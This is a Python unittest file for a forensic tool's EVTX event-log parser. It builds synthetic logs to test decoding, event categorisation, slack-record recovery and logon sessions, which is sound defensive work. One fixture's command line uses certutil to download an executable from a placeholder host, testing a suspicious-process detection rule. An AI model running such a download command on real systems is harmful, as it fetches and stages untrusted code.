"""Parser-quality round 1 (W1): native EVTX walking, BinXML decoding and provider-keyed semantics.

Fixtures are synthetic EVTX files written in-test by ``EvtxWriter`` (a small
BinXML/chunk writer: resident and chunk-referenced templates, normal and
optional substitutions, nested BinXml values, slack copies and inactive
chunks). No evidence file is copied into the repository.
"""

from __future__ import annotations

import datetime as dt
import struct
import tempfile
import tracemalloc
import unittest
from collections import Counter
from pathlib import Path

from rapidtriage.artifacts.windows.eventlog import (
    EVTX_FILETIME_EPOCH,
    WindowsEventLogProvider,
    build_builtin_detection_records,
    collect_native_evtx_events,
    event_category_for,
    filetime_to_iso_100ns,
)

EVENTDATA = "eventdata"


def filetime(moment: dt.datetime, extra_100ns: int = 0) -> int:
    return (moment - EVTX_FILETIME_EPOCH) // dt.timedelta(microseconds=1) * 10 + extra_100ns


# -- typed substitution values ---------------------------------------------------
def wstr(text: str) -> tuple[int, bytes]:
    return 0x01, text.encode("utf-16le")


def u8(value: int) -> tuple[int, bytes]:
    return 0x04, struct.pack("<B", value)


def u16(value: int) -> tuple[int, bytes]:
    return 0x06, struct.pack("<H", value)


def u32(value: int) -> tuple[int, bytes]:
    return 0x08, struct.pack("<I", value)


def u64(value: int) -> tuple[int, bytes]:
    return 0x0A, struct.pack("<Q", value)


def hex64(value: int) -> tuple[int, bytes]:
    return 0x15, struct.pack("<Q", value)


def ft(value: int) -> tuple[int, bytes]:
    return 0x11, struct.pack("<Q", value)


def guid(raw: bytes) -> tuple[int, bytes]:
    return 0x0F, raw


def null() -> tuple[int, bytes]:
    return 0x00, b""


def sid(text: str) -> tuple[int, bytes]:
    parts = text.split("-")
    revision, authority, subs = int(parts[1]), int(parts[2]), [int(item) for item in parts[3:]]
    raw = bytes([revision, len(subs)]) + authority.to_bytes(6, "big") + b"".join(struct.pack("<I", item) for item in subs)
    return 0x13, raw


class Sub:
    def __init__(self, index: int, value_type: int, optional: bool = False) -> None:
        self.index, self.value_type, self.optional = index, value_type, optional


class El:
    def __init__(self, name: str, attrs: list[tuple[str, object]] | None = None, children: list[object] | None = None) -> None:
        self.name, self.attrs, self.children = name, attrs or [], children or []


def name_node(name: str) -> bytes:
    return b"\x00\x00\x00\x00" + b"\x00\x00" + struct.pack("<H", len(name)) + name.encode("utf-16le") + b"\x00\x00"


def encode_tree(node: object, base: int) -> bytes:
    """Encode template-definition tokens; ``base`` is the chunk offset of the first byte."""
    out = bytearray()

    def emit_content(item: object) -> None:
        if isinstance(item, El):
            out.extend(encode_tree(item, base + len(out)))
        elif isinstance(item, Sub):
            out.extend(bytes([0x0E if item.optional else 0x0D]) + struct.pack("<HB", item.index, item.value_type))
        else:
            text = str(item)
            out.extend(b"\x05\x01" + struct.pack("<H", len(text)) + text.encode("utf-16le"))

    assert isinstance(node, El)
    start = base + len(out)
    token = 0x41 if node.attrs else 0x01
    out.extend(bytes([token]) + b"\xff\xff" + b"\x00\x00\x00\x00" + struct.pack("<I", start + 11))
    out.extend(name_node(node.name))
    if node.attrs:
        out.extend(b"\x00\x00\x00\x00")  # attribute list size (not used by readers)
        for position, (attr_name, value) in enumerate(node.attrs):
            attr_start = base + len(out)
            more = 0x40 if position + 1 < len(node.attrs) else 0
            out.extend(bytes([0x06 | more]) + struct.pack("<I", attr_start + 5) + name_node(attr_name))
            emit_content(value)
    if not node.children:
        out.append(0x03)
        return bytes(out)
    out.append(0x02)
    for child in node.children:
        emit_content(child)
    out.append(0x04)
    return bytes(out)


def system_tree(event_data: El | Sub) -> El:
    return El(
        "Event",
        children=[
            El(
                "System",
                children=[
                    El("Provider", attrs=[("Name", Sub(0, 0x01)), ("Guid", Sub(1, 0x0F, True))]),
                    El("EventID", attrs=[("Qualifiers", Sub(2, 0x06, True))], children=[Sub(3, 0x06)]),
                    El("Version", children=[Sub(4, 0x04)]),
                    El("Level", children=[Sub(5, 0x04)]),
                    El("Task", children=[Sub(6, 0x06)]),
                    El("Opcode", children=[Sub(7, 0x04)]),
                    El("Keywords", children=[Sub(8, 0x15)]),
                    El("TimeCreated", attrs=[("SystemTime", Sub(9, 0x11))]),
                    El("EventRecordID", children=[Sub(10, 0x0A)]),
                    El("Correlation", attrs=[("ActivityID", Sub(11, 0x0F, True))]),
                    El("Execution", attrs=[("ProcessID", Sub(12, 0x08)), ("ThreadID", Sub(13, 0x08))]),
                    El("Channel", children=[Sub(14, 0x01)]),
                    El("Computer", children=[Sub(15, 0x01)]),
                    El("Security", attrs=[("UserID", Sub(16, 0x13, True))]),
                ],
            ),
            event_data,
        ],
    )


SYSTEM_VALUE_COUNT = 17


def event_data_tree(names: list[str | None], first_index: int = SYSTEM_VALUE_COUNT) -> El:
    children = []
    for offset, name in enumerate(names):
        attrs = [("Name", name)] if name is not None else []
        children.append(El("Data", attrs=attrs, children=[Sub(first_index + offset, 0x01, True)]))
    return El("EventData", children=children)


def user_data_tree(wrapper: str, names: list[str], first_index: int = SYSTEM_VALUE_COUNT) -> El:
    return El(
        "UserData",
        children=[El(wrapper, children=[El(name, children=[Sub(first_index + i, 0x01)]) for i, name in enumerate(names)])],
    )


class Event:
    """One record: provider/system values + event data values (typed)."""

    def __init__(
        self,
        *,
        record_id: int,
        provider: str,
        event_id: int,
        channel: str,
        when: int,
        data: list[tuple[str | None, tuple[int, bytes]]] | None = None,
        user_data: tuple[str, list[tuple[str, tuple[int, bytes]]]] | None = None,
        qualifiers: int | None = None,
        user_sid: str | None = "S-1-5-18",
        computer: str = "WIN-QA",
        nested: bool = False,
        header_filetime: int | None = None,
    ) -> None:
        self.record_id = record_id
        self.provider = provider
        self.event_id = event_id
        self.channel = channel
        self.when = when
        self.data = data or []
        self.user_data = user_data
        self.qualifiers = qualifiers
        self.user_sid = user_sid
        self.computer = computer
        self.nested = nested
        self.header_filetime = when if header_filetime is None else header_filetime

    def system_values(self) -> list[tuple[int, bytes]]:
        return [
            wstr(self.provider),
            guid(bytes(range(16))),
            u16(self.qualifiers) if self.qualifiers is not None else null(),
            u16(self.event_id),
            u8(0),
            u8(4),
            u16(12544),
            u8(0),
            hex64(0x8020000000000000),
            ft(self.when),
            u64(self.record_id),
            null(),
            u32(612),
            u32(616),
            wstr(self.channel),
            wstr(self.computer),
            sid(self.user_sid) if self.user_sid else null(),
        ]

    def template_key(self) -> tuple:
        if self.user_data is not None:
            return ("user", self.user_data[0], tuple(name for name, _ in self.user_data[1]))
        return ("data", tuple(name for name, _ in self.data), self.nested)


class EvtxWriter:
    """Writes ElfFile/ElfChnk/record/BinXML bytes the way Windows lays them out."""

    def __init__(self) -> None:
        self.chunks: list[bytearray] = []
        self.chunk_ranges: list[tuple[int, int]] = []

    def build_chunk(self, events: list[Event], *, slack: list[Event] | None = None) -> list[bytes]:
        chunk = bytearray(512)
        templates: dict[tuple, int] = {}
        records: list[bytes] = []
        for event in events:
            record = self._record(chunk, event, templates)
            if len(chunk) + len(record) > 65536 - 1024:
                raise OverflowError
            chunk.extend(record)
            records.append(record)
        free_space = len(chunk)
        for event in slack or []:
            chunk.extend(b"\x00" * 16)
            chunk.extend(self._record(chunk, event, templates))
        chunk.extend(b"\x00" * (65536 - len(chunk)))
        chunk[0:8] = b"ElfChnk\x00"
        ids = [event.record_id for event in events] or [0]
        struct.pack_into("<QQQQ", chunk, 8, min(ids), max(ids), min(ids), max(ids))
        struct.pack_into("<III", chunk, 40, 128, (free_space - len(records[-1])) if records else 512, free_space)
        self.chunks.append(chunk)
        return records

    def _template_bytes(self, event: Event, base: int) -> bytes:
        if event.user_data is not None:
            data_tree: El | Sub = user_data_tree(event.user_data[0], [name for name, _ in event.user_data[1]])
        elif event.nested:
            data_tree = Sub(SYSTEM_VALUE_COUNT, 0x21, True)
        else:
            data_tree = event_data_tree([name for name, _ in event.data])
        body_base = base + 24
        body = b"\x0f\x01\x01\x00" + encode_tree(system_tree(data_tree), body_base + 4) + b"\x00"
        return b"\x00\x00\x00\x00" + bytes(range(16, 32)) + struct.pack("<I", len(body)) + body

    def _instance(self, chunk_offset: int, key: tuple, templates: dict[tuple, int], template_factory, values: list[tuple[int, bytes]]) -> bytes:
        out = bytearray(b"\x0c\x01" + struct.pack("<I", 0x1234))
        position = chunk_offset + len(out) + 4
        if key in templates:
            out.extend(struct.pack("<I", templates[key]))
        else:
            templates[key] = position
            out.extend(struct.pack("<I", position))
            out.extend(template_factory(position))
        out.extend(struct.pack("<I", len(values)))
        for value_type, raw in values:
            out.extend(struct.pack("<HBB", len(raw), value_type, 0))
        for _, raw in values:
            out.extend(raw)
        return bytes(out)

    def _nested_event_data(self, value_offset: int, event: Event, templates: dict[tuple, int]) -> bytes:
        names = [name for name, _ in event.data]
        key = ("nested-eventdata", tuple(names))

        def factory(base: int) -> bytes:
            body = b"\x0f\x01\x01\x00" + encode_tree(event_data_tree(names, 0), base + 24 + 4) + b"\x00"
            return b"\x00\x00\x00\x00" + bytes(range(32, 48)) + struct.pack("<I", len(body)) + body

        return b"\x0f\x01\x01\x00" + self._instance(value_offset + 4, key, templates, factory, [value for _, value in event.data])

    def _record(self, chunk: bytearray, event: Event, templates: dict[tuple, int]) -> bytes:
        record_offset = len(chunk)
        payload_offset = record_offset + 24
        values = event.system_values()
        if event.user_data is not None:
            values.extend(value for _, value in event.user_data[1])
        elif event.nested:
            values.append((0x21, b""))  # placeholder, encoded below once its offset is known
        else:
            values.extend(value for _, value in event.data)
        key = event.template_key()
        instance = self._instance(payload_offset + 4, key, templates, lambda base: self._template_bytes(event, base), values)
        if event.nested:
            nested_offset = payload_offset + 4 + len(instance)
            nested = self._nested_event_data(nested_offset, event, templates)
            values[-1] = (0x21, nested)
            instance = self._instance_with_known_template(payload_offset + 4, key, templates, values, instance)
        payload = b"\x0f\x01\x01\x00" + instance
        size = 24 + len(payload) + 4
        return b"**\x00\x00" + struct.pack("<IQQ", size, event.record_id, event.header_filetime) + payload + struct.pack("<I", size)

    def _instance_with_known_template(self, chunk_offset: int, key: tuple, templates: dict[tuple, int], values, previous: bytes) -> bytes:
        # Re-emit with the final nested value; keep the resident definition if it was written by ``previous``.
        template_offset = templates[key]
        out = bytearray(b"\x0c\x01" + struct.pack("<I", 0x1234) + struct.pack("<I", template_offset))
        if template_offset == chunk_offset + 10:
            definition_length = struct.unpack_from("<I", previous, 10 + 20)[0] + 24
            out.extend(previous[10 : 10 + definition_length])
        out.extend(struct.pack("<I", len(values)))
        for value_type, raw in values:
            out.extend(struct.pack("<HBB", len(raw), value_type, 0))
        for _, raw in values:
            out.extend(raw)
        return bytes(out)

    def file_bytes(self, *, declared_chunks: int | None = None) -> bytes:
        header = bytearray(4096)
        header[0:8] = b"ElfFile\x00"
        struct.pack_into("<QQQ", header, 8, 0, max(len(self.chunks) - 1, 0), 1)
        struct.pack_into("<IHHHH", header, 32, 128, 1, 3, 4096, len(self.chunks) if declared_chunks is None else declared_chunks)
        return bytes(header) + b"".join(bytes(chunk) for chunk in self.chunks)


def write_evtx(path: Path, writer: EvtxWriter, **kwargs: object) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(writer.file_bytes(**kwargs))
    return path


BASE_TIME = dt.datetime(2025, 5, 27, 1, 51, 29, tzinfo=dt.timezone.utc)
SECURITY = "Microsoft-Windows-Security-Auditing"


def logon_event(record_id: int, when: int, *, user: str, logon_id: int, logon_type: int = 10, ip: str = "192.0.2.7") -> Event:
    return Event(
        record_id=record_id,
        provider=SECURITY,
        event_id=4624,
        channel="Security",
        when=when,
        data=[
            ("SubjectUserSid", sid("S-1-5-18")),
            ("SubjectUserName", wstr("진료실1$")),
            ("SubjectDomainName", wstr("WORKGROUP")),
            ("SubjectLogonId", hex64(0x3E7)),
            ("TargetUserSid", sid("S-1-5-21-1111-2222-3333-1001")),
            ("TargetUserName", wstr(user)),
            ("TargetDomainName", wstr("진료실1")),
            ("TargetLogonId", hex64(logon_id)),
            ("LogonType", u32(logon_type)),
            ("WorkstationName", wstr("원격PC")),
            ("ProcessName", wstr("C:\\Windows\\System32\\svchost.exe")),
            ("IpAddress", wstr(ip)),
            ("IpPort", wstr("50123")),
        ],
    )


def collect(path: Path, **kwargs: object) -> tuple[list, dict[str, int]]:
    stats: dict[str, int] = {}
    rows = list(collect_native_evtx_events(path, stats=stats, **kwargs))
    return rows, stats


def events_of(rows: list) -> list[dict]:
    return [row.details for row in rows if row.artifact_type == "eventlog-event"]


class NativeEvtxStreamingTests(unittest.TestCase):
    def test_streams_more_than_10k_records_in_order_without_cap(self) -> None:
        writer = EvtxWriter()
        total = 10_250
        record_id = 1
        while record_id <= total:
            batch = []
            for _ in range(220):
                if record_id > total:
                    break
                batch.append(
                    Event(
                        record_id=record_id,
                        provider="Microsoft-Windows-Kernel-General",
                        event_id=16,
                        channel="System",
                        when=filetime(BASE_TIME) + record_id,
                        data=[("Value", u32(record_id))],
                    )
                )
                record_id += 1
            writer.build_chunk(batch)
        with tempfile.TemporaryDirectory() as tmp:
            path = write_evtx(Path(tmp) / "Big.evtx", writer)
            stats: dict[str, int] = {}
            tracemalloc.start()
            seen: list[int] = []
            try:
                for row in collect_native_evtx_events(path, record_detail="triage", structure_rows=False, stats=stats):
                    seen.append(int(row.details["record_id"]))
                _, peak = tracemalloc.get_traced_memory()
            finally:
                tracemalloc.stop()
        self.assertEqual(len(seen), total)
        self.assertEqual(seen, list(range(1, total + 1)))
        self.assertEqual(stats["live_record_count"], total)
        self.assertEqual(stats["decoded_record_count"], total)
        self.assertGreater(stats["chunk_count"], 1)
        # Memory is bounded by one chunk plus per-row state, not by the record count.
        self.assertLess(peak, 48 * 1024 * 1024)

    def test_file_row_discloses_full_walk_counts(self) -> None:
        writer = EvtxWriter()
        writer.build_chunk([logon_event(1, filetime(BASE_TIME), user="alice", logon_id=0x10)])
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_evtx(root / "Windows" / "System32" / "winevt" / "Logs" / "Security.evtx", writer)
            rows = list(WindowsEventLogProvider(record_detail="triage", structure_rows=False).collect(root))
        file_row = next(row.details for row in rows if row.artifact_type == "eventlog-file")
        self.assertFalse(file_row["native_records_truncated"])
        self.assertIsNone(file_row["native_record_limit"])
        self.assertEqual(file_row["native_live_record_count"], 1)
        self.assertEqual(file_row["native_decoded_record_count"], 1)
        self.assertEqual(file_row["native_parse_status"], "complete-chunk-walk-decoded")
        self.assertEqual(file_row["native_binxml_status"], "decoded")
        self.assertIn("상한 없이", file_row["native_parse_note_ko"])


class NativeEvtxDecodeTests(unittest.TestCase):
    def _single(self, event: Event, **kwargs: object) -> dict:
        writer = EvtxWriter()
        writer.build_chunk([event])
        with tempfile.TemporaryDirectory() as tmp:
            path = write_evtx(Path(tmp) / "One.evtx", writer)
            rows, _ = collect(path, **kwargs)
        events = events_of(rows)
        self.assertEqual(len(events), 1)
        return events[0]

    def test_decodes_4624_eventdata_with_korean_strings_and_sid(self) -> None:
        details = self._single(logon_event(653881, filetime(BASE_TIME, 4109), user="홍길동", logon_id=0x1A2B))
        self.assertEqual(details["evtx_binxml_status"], "decoded")
        self.assertEqual(details["event_id"], "4624")
        self.assertEqual(details["provider_name"], SECURITY)
        self.assertEqual(details["provider_guid"], "{03020100-0504-0706-0809-0A0B0C0D0E0F}")
        self.assertEqual(details["channel"], "Security")
        self.assertEqual(details["record_id"], "653881")
        self.assertEqual(details["user_sid"], "S-1-5-18")
        self.assertEqual(details["process_id"], "612")
        self.assertEqual(details["thread_id"], "616")
        self.assertEqual(details["keywords"], "0x8020000000000000")
        fields = details["binxml_event_data_fields"]
        self.assertEqual(list(fields)[:3], ["SubjectUserSid", "SubjectUserName", "SubjectDomainName"])
        self.assertEqual(fields["TargetUserSid"], "S-1-5-21-1111-2222-3333-1001")
        self.assertEqual(fields["SubjectUserName"], "진료실1$")
        self.assertEqual(fields["TargetLogonId"], "0x1a2b")
        self.assertEqual(details["user_name"], "홍길동")
        self.assertEqual(details["user_name_source"], "TargetUserName")
        self.assertEqual(details["target_user_name"], "홍길동")
        self.assertEqual(details["subject_user_name"], "진료실1$")
        self.assertEqual(details["target_domain_name"], "진료실1")
        self.assertEqual(details["logon_type"], "10")
        self.assertEqual(details["logon_id"], "0x1a2b")
        self.assertEqual(details["source_ip"], "192.0.2.7")
        self.assertEqual(details["workstation_name"], "원격PC")
        self.assertEqual(details["process_name"], "C:\\Windows\\System32\\svchost.exe")
        self.assertEqual(details["event_category"], "logon-success")
        self.assertEqual(details["event_label_ko"], "로그온 성공")
        # Keywords / Security UserID must never become an identity value.
        self.assertNotEqual(details["user_name"], details["keywords"])
        self.assertIn("<Data Name=\"TargetUserName\">홍길동</Data>", details["evtx_binxml"]["rendered_preview"])

    def test_decodes_7045_service_install_fields(self) -> None:
        details = self._single(
            Event(
                record_id=77,
                provider="Service Control Manager",
                event_id=7045,
                qualifiers=16384,
                channel="System",
                when=filetime(BASE_TIME),
                user_sid="S-1-5-21-1111-2222-3333-500",
                data=[
                    ("ServiceName", wstr("업데이트 도우미")),
                    ("ImagePath", wstr("C:\\Users\\홍길동\\AppData\\Local\\Temp\\svc.exe")),
                    ("ServiceType", wstr("사용자 모드 서비스")),
                    ("StartType", wstr("자동 시작")),
                    ("AccountName", wstr("LocalSystem")),
                ],
            )
        )
        self.assertEqual(details["event_id"], "7045")
        self.assertEqual(details["event_id_qualifiers"], "16384")
        self.assertEqual(details["service_name"], "업데이트 도우미")
        self.assertEqual(details["service_file_name"], "C:\\Users\\홍길동\\AppData\\Local\\Temp\\svc.exe")
        self.assertEqual(details["service_account_name"], "LocalSystem")
        self.assertEqual(details["user_name"], "")
        self.assertEqual(details["user_sid"], "S-1-5-21-1111-2222-3333-500")
        self.assertEqual(details["event_category"], "service-installed")
        rules = {row.details["rule"]["id"] for row in build_builtin_detection_records([_row(details)])}
        self.assertIn("RT-EVTX-SERVICE-INSTALLED", rules)

    def test_decodes_4688_process_creation_fields(self) -> None:
        details = self._single(
            Event(
                record_id=88,
                provider=SECURITY,
                event_id=4688,
                channel="Security",
                when=filetime(BASE_TIME),
                data=[
                    ("SubjectUserSid", sid("S-1-5-21-1111-2222-3333-1001")),
                    ("SubjectUserName", wstr("홍길동")),
                    ("SubjectLogonId", hex64(0x1A2B)),
                    ("NewProcessId", hex64(0x1F4)),
                    ("NewProcessName", wstr("C:\\Windows\\System32\\cmd.exe")),
                    ("TargetUserName", wstr("-")),
                    ("CommandLine", wstr("cmd.exe /c certutil -urlcache -f http://192.0.2.9/a.exe 한글.exe")),
                    ("ParentProcessName", wstr("C:\\Windows\\explorer.exe")),
                ],
            )
        )
        self.assertEqual(details["event_category"], "process-created")
        self.assertEqual(details["user_name"], "홍길동")
        self.assertEqual(details["user_name_source"], "SubjectUserName")
        self.assertEqual(details["target_user_name"], "")
        self.assertEqual(details["new_process_name"], "C:\\Windows\\System32\\cmd.exe")
        self.assertEqual(details["process_name"], "C:\\Windows\\System32\\cmd.exe")
        self.assertIn("certutil", details["command_line"])
        self.assertEqual(details["parent_process_name"], "C:\\Windows\\explorer.exe")
        self.assertEqual(details["logon_id"], "0x1a2b")
        rules = {row.details["rule"]["id"] for row in build_builtin_detection_records([_row(details)])}
        self.assertIn("RT-EVTX-SUSPICIOUS-PROCESS", rules)

    def test_unnamed_data_and_qualifiers_event_id(self) -> None:
        details = self._single(
            Event(
                record_id=5,
                provider="Service Control Manager",
                event_id=7036,
                qualifiers=16384,
                channel="System",
                when=filetime(BASE_TIME),
                data=[(None, wstr("Windows Update")), (None, wstr("실행 중")), (None, wstr(""))],
            )
        )
        self.assertEqual(details["event_id"], "7036")
        self.assertEqual(details["event_id_qualifiers"], "16384")
        self.assertEqual(details["binxml_event_data_fields"], {"data_1": "Windows Update", "data_2": "실행 중", "data_3": ""})
        self.assertEqual(details["event_category"], "service-state-changed")

    def test_nested_binxml_eventdata_and_user_data(self) -> None:
        nested = self._single(
            Event(
                record_id=9,
                provider=SECURITY,
                event_id=4672,
                channel="Security",
                when=filetime(BASE_TIME),
                nested=True,
                data=[("SubjectUserName", wstr("홍길동")), ("SubjectLogonId", hex64(0x1A2B)), ("PrivilegeList", wstr("SeDebugPrivilege"))],
            )
        )
        self.assertEqual(nested["binxml_event_data_fields"]["PrivilegeList"], "SeDebugPrivilege")
        self.assertEqual(nested["user_name"], "홍길동")
        self.assertEqual(nested["logon_id"], "0x1a2b")
        cleared = self._single(
            Event(
                record_id=10,
                provider="Microsoft-Windows-Eventlog",
                event_id=1102,
                channel="Security",
                when=filetime(BASE_TIME),
                user_data=("LogFileCleared", [("SubjectUserSid", wstr("S-1-5-21-1-2-3-500")), ("SubjectUserName", wstr("관리자"))]),
            )
        )
        self.assertEqual(cleared["event_data_source"], "UserData")
        self.assertEqual(cleared["binxml_user_data_fields"]["UserData.SubjectUserName"], "관리자")
        self.assertEqual(cleared["user_name"], "관리자")
        self.assertEqual(cleared["event_category"], "audit-log-cleared")

    def test_filetime_keeps_100ns_and_raw_value(self) -> None:
        raw = filetime(BASE_TIME, 4109)
        details = self._single(logon_event(1, raw, user="alice", logon_id=1))
        self.assertEqual(details["timestamp_filetime"], raw)
        self.assertEqual(details["timestamp_100ns"], "2025-05-27T01:51:29.0004109Z")
        self.assertEqual(details["timestamp"], "2025-05-27T01:51:29.000410+00:00")
        self.assertEqual(details["binxml_system_fields"]["TimeCreated"], "2025-05-27T01:51:29.0004109Z")
        self.assertEqual(filetime_to_iso_100ns(raw), "2025-05-27T01:51:29.0004109Z")
        self.assertEqual(details["timestamp_status"], "ok")


class ProviderKeyedCategoryTests(unittest.TestCase):
    def test_event_104_is_log_cleared_only_from_eventlog_provider(self) -> None:
        writer = EvtxWriter()
        when = filetime(BASE_TIME)
        writer.build_chunk(
            [
                Event(
                    record_id=1,
                    provider="Microsoft-Windows-Eventlog",
                    event_id=104,
                    channel="System",
                    when=when,
                    user_data=("LogFileCleared", [("SubjectUserName", wstr("관리자")), ("Channel", wstr("Application"))]),
                ),
                Event(record_id=2, provider="Microsoft-Windows-Kernel-Cache", event_id=104, channel="System", when=when, data=[("Status", wstr("0"))]),
                Event(record_id=3, provider="Microsoft-Windows-Kernel-Power", event_id=1, channel="System", when=when, data=[("Reason", wstr("1"))]),
                Event(record_id=4, provider="Microsoft-Windows-Kernel-Boot", event_id=21, channel="System", when=when, data=[("Session", wstr("1"))]),
                Event(record_id=5, provider="Microsoft-Windows-WindowsUpdateClient", event_id=2004, channel="System", when=when, data=[("x", wstr("1"))]),
                Event(record_id=6, provider="Microsoft-Windows-Kernel-General", event_id=1102, channel="System", when=when, data=[("x", wstr("1"))]),
            ]
        )
        with tempfile.TemporaryDirectory() as tmp:
            rows, _ = collect(write_evtx(Path(tmp) / "System.evtx", writer))
        events = {int(item["record_id"]): item for item in events_of(rows)}
        self.assertEqual(events[1]["event_category"], "system-log-cleared")
        self.assertEqual(events[1]["user_name"], "관리자")
        for record_id in (2, 3, 4, 5, 6):
            self.assertEqual(events[record_id]["event_category"], "event", record_id)
            self.assertNotIn("high-value-event-id:104", events[record_id]["risk_flags"])
        detections = Counter(
            row.details["rule"]["id"] for row in build_builtin_detection_records([_row(item) for item in events.values()])
        )
        self.assertEqual(detections["RT-EVTX-LOG-CLEARED"], 1)
        self.assertEqual(detections["RT-EVTX-RDP-SESSION"], 0)
        self.assertEqual(detections["RT-EVTX-FIREWALL-RULE-CHANGE"], 0)
        self.assertFalse(any(rule.startswith("RT-EVTX-SYSMON") for rule in detections))

    def test_terminal_services_local_console_is_not_rdp(self) -> None:
        lsm = "Microsoft-Windows-TerminalServices-LocalSessionManager"
        channel = f"{lsm}/Operational"
        self.assertEqual(event_category_for("21", channel, lsm, {"UserData.Address": "LOCAL"})[0], "local-session-logon")
        self.assertEqual(event_category_for("21", channel, lsm, {"Address": "192.0.2.10"})[0], "rdp-session-logon")
        self.assertEqual(event_category_for("21", "System", "Microsoft-Windows-Kernel-Boot", {})[0], "event")
        # Exports without a provider fall back to (channel, EventID).
        self.assertEqual(event_category_for("4104", "Microsoft-Windows-PowerShell/Operational", "", {})[0], "powershell-script-block")
        self.assertEqual(event_category_for("4104", "Application", "", {})[0], "event")


class SlackAndRangeTests(unittest.TestCase):
    def test_slack_copy_of_live_record_is_not_an_event(self) -> None:
        writer = EvtxWriter()
        when = filetime(BASE_TIME)
        live = [logon_event(record_id, when + record_id, user="alice", logon_id=record_id) for record_id in (100, 101, 102)]
        records = writer.build_chunk(
            live,
            slack=[logon_event(5, when, user="deleted-user", logon_id=5)],
        )
        # Append a byte-identical slack copy of live record 101 after the slack record.
        chunk = writer.chunks[-1]
        tail = max(index for index in range(len(chunk)) if chunk[index]) + 1
        chunk[tail + 16 : tail + 16 + len(records[1])] = records[1]
        with tempfile.TemporaryDirectory() as tmp:
            path = write_evtx(Path(tmp) / "Security.evtx", writer)
            rows, stats = collect(path, structure_rows=True)
        events = events_of(rows)
        states = Counter(item["evtx_record_state"] for item in events)
        self.assertEqual(states["live"], 3)
        self.assertEqual(states["slack-recovered"], 1)
        self.assertEqual(stats["slack_duplicate_count"], 1)
        self.assertEqual(Counter(item["record_id"] for item in events)["101"], 1)
        duplicate = next(row.details for row in rows if row.artifact_type == "eventlog-record-candidate")
        self.assertEqual(duplicate["coverage_status"], "slack-duplicate-of-live-record")
        self.assertEqual(duplicate["record_id"], "101")
        recovered = next(item for item in events if item["evtx_record_state"] == "slack-recovered")
        self.assertEqual(recovered["user_name"], "deleted-user")
        self.assertEqual(recovered["evtx_recovery_status"], "slack-or-deleted-record-candidate")
        self.assertTrue(recovered["validation_required"])

    def test_out_of_range_timestamps_are_labelled_and_excluded_from_stats(self) -> None:
        writer = EvtxWriter()
        good = filetime(BASE_TIME)
        ancient = 116444736000000000 - 10**15  # well before 1980
        future = filetime(dt.datetime(2199, 1, 1, tzinfo=dt.timezone.utc))
        writer.build_chunk(
            [logon_event(1, good, user="alice", logon_id=1), logon_event(2, good + 10, user="alice", logon_id=1)],
            slack=[logon_event(40, ancient, user="old", logon_id=9), logon_event(41, future, user="future", logon_id=9)],
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_evtx(root / "Windows" / "System32" / "winevt" / "Logs" / "Security.evtx", writer)
            rows = list(WindowsEventLogProvider(record_detail="triage", structure_rows=False).collect(root))
        events = [row.details for row in rows if row.artifact_type == "eventlog-event"]
        by_id = {item["record_id"]: item for item in events}
        self.assertEqual(by_id["40"]["timestamp_status"], "out-of-range-before-1980")
        self.assertEqual(by_id["41"]["timestamp_status"], "out-of-range-future")
        for record_id in ("40", "41"):
            self.assertEqual(by_id[record_id]["timestamp"], "")
            self.assertTrue(by_id[record_id]["timestamp_raw_iso"] or by_id[record_id]["timestamp_100ns"])
        summary = next(row.details for row in rows if row.artifact_type == "eventlog-summary")
        self.assertEqual(summary["first_event_at"], by_id["1"]["timestamp"])
        self.assertEqual(summary["last_event_at"], by_id["2"]["timestamp"])
        self.assertEqual(summary["timestamp_out_of_range_count"], 2)
        self.assertEqual(summary["record_sequence_gaps"], [])
        file_row = next(row.details for row in rows if row.artifact_type == "eventlog-file")
        self.assertEqual(file_row["native_timestamp_out_of_range_count"], 2)
        self.assertEqual(file_row["native_slack_recovered_record_count"], 2)

    def test_inactive_chunk_records_are_flagged(self) -> None:
        writer = EvtxWriter()
        when = filetime(BASE_TIME)
        writer.build_chunk([logon_event(1, when, user="alice", logon_id=1)])
        writer.build_chunk([logon_event(900, when, user="old", logon_id=2), logon_event(1, when, user="alice", logon_id=1)])
        with tempfile.TemporaryDirectory() as tmp:
            rows, stats = collect(write_evtx(Path(tmp) / "Security.evtx", writer, declared_chunks=1))
        events = events_of(rows)
        self.assertEqual([item["evtx_record_state"] for item in events], ["live", "inactive-chunk"])
        self.assertFalse(events[1]["evtx_chunk_active"])
        self.assertEqual(stats["inactive_chunk_count"], 1)
        self.assertEqual(stats["slack_duplicate_count"], 1)


class LogonSessionTests(unittest.TestCase):
    def test_sessions_keyed_by_target_user_and_logon_id_with_reuse(self) -> None:
        writer = EvtxWriter()
        t0 = filetime(BASE_TIME)
        minute = 60 * 10_000_000
        privileged = Event(
            record_id=11,
            provider=SECURITY,
            event_id=4672,
            channel="Security",
            when=t0 + 1,
            data=[("SubjectUserName", wstr("홍길동")), ("SubjectLogonId", hex64(0x1A2B)), ("PrivilegeList", wstr("SeDebugPrivilege"))],
        )
        logoff = Event(
            record_id=12,
            provider=SECURITY,
            event_id=4634,
            channel="Security",
            when=t0 + 30 * minute,
            data=[("TargetUserName", wstr("홍길동")), ("TargetLogonId", hex64(0x1A2B)), ("LogonType", u32(10))],
        )
        writer.build_chunk(
            [
                logon_event(10, t0, user="홍길동", logon_id=0x1A2B),
                privileged,
                logoff,
                logon_event(13, t0 + 90 * minute, user="홍길동", logon_id=0x1A2B, logon_type=2, ip="-"),
                logon_event(14, t0 + 91 * minute, user="other", logon_id=0x1A2B, logon_type=3, ip="192.0.2.20"),
            ]
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_evtx(root / "Windows" / "System32" / "winevt" / "Logs" / "Security.evtx", writer)
            rows = list(WindowsEventLogProvider(record_detail="triage", structure_rows=False).collect(root))
        sessions = [row.details for row in rows if row.artifact_type == "eventlog-logon-session"]
        self.assertEqual(len(sessions), 3)
        first = next(item for item in sessions if item["user_name"] == "홍길동" and item["session_occurrence"] == 0)
        self.assertEqual(first["session_key"], "WIN-QA|홍길동|0x1a2b")
        self.assertEqual(first["session_key_basis"], "user-and-logon-id")
        self.assertEqual(first["event_ids"], ["4624", "4672", "4634"])
        self.assertEqual(first["session_status"], "closed")
        self.assertEqual(first["duration_seconds"], 1800)
        self.assertEqual(first["logon_type"], "10")
        self.assertIn("rdp-logon-session", first["risk_flags"])
